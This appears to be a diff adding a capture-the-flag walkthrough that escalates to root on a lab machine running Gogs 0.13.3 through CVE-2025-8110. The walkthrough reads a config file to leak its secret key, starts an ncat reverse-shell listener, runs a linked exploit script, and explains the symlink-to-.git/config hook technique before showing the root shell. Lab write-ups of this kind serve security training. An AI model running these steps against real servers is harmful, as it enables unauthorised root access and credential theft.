@@ -1,0 +1,87 @@
+Source:     https://github.com/zAbuQasem/gogs-CVE-2025-8110/blob/main/CVE-2025-8110.py
+
+
+########## TUNNEL TO MY MACHINE TO VIEW GOGS IN BROWSER ##########
+$> ssh ben@10.129.29.121 -L 3001:127.0.0.1:3001
+
+
+########## GET GOGS VERSION ##########
+$> cd /opt/gogs/gogs && gogs --version
+
+Gogs version 0.13.3
+
+
+########## LEAK SOMETHING ##########
+$> cat custom/conf/app.ini
+
+[...]
+
+[server]
+HTTP_ADDR        = 127.0.0.1
+HTTP_PORT        = 3001
+DOMAIN           = staging-v2-code.dev.silentium.htb
+ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
+...
+
+[database]
+TYPE     = sqlite3
+PATH     = /opt/gogs/data/gogs.db
+HOST     = 127.0.0.1:5432
+NAME     = gogs
+SCHEMA   = public
+USER     = gogs
+PASSWORD = 
+SSL_MODE = disable
+
+[repository]
+ROOT_PATH      = /root/gogs-repositories
+DEFAULT_BRANCH = master
+ROOT           = /root/gogs-repositories
+
+[...]
+
+[security]
+INSTALL_LOCK = true
+SECRET_KEY   = sdsrcxSm0iC7wDO
+
+
+########## [EXTRA] GENERATE API TOKEN ##########
+Navigate to "Your Settings" > "Applications" > "Generate New Token"
+
+39a91afdbeb38cd0661fb04630530d600b2c8353
+
+
+########## PREPARE LISTENER ##########
+$> ncat -lvnp 4444
+
+[...]
+
+
+########## USE THE SCRIPT (IN LOCAL) PROVIDED IN THE SOURCE LINK ##########
+$> python3 -m venv ./venv
+$> source venv/bin/activate
+$> pip3 install requirements.txt
+$> python3 exploit.py -u http://127.0.0.1:3001 -lh 10.10.16.153 -lp 4444 --username vego --password vego
+
+    NOTE: We've modified the script to avoid the registration since we've had already registered a user.
+          Moreover, the script used hardcoded username and password, so we changed it to take them as arguments.
+
+    EXPLANATION:
+        This exploit leverages a symbolic link path traversal vulnerability within the Gogs API to
+        achieve arbitrary file overwrite and subsequent code execution.
+        By pushing a repository containing a symlink that points to the internal `.git/config` file,
+        an attacker creates a functional "bridge" between the user-accessible web interface and the
+        sensitive server-side repository configuration.
+        When the attacker uses the Gogs API to update the content of that symlink, the application
+        follows the link and overwrites the actual `.git/config` file with malicious parameters,
+        specifically an executable Git hook such as `post-receive`.
+        Because the Gogs service is running as the root user, any commands embedded within this
+        hook (such as a reverse shell) are executed with highest-level system privileges the
+        moment a new push is received by the server.
+
+
+########## ENJOY THE ROOT SHELL #########
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/5# whoami
+
+root
+
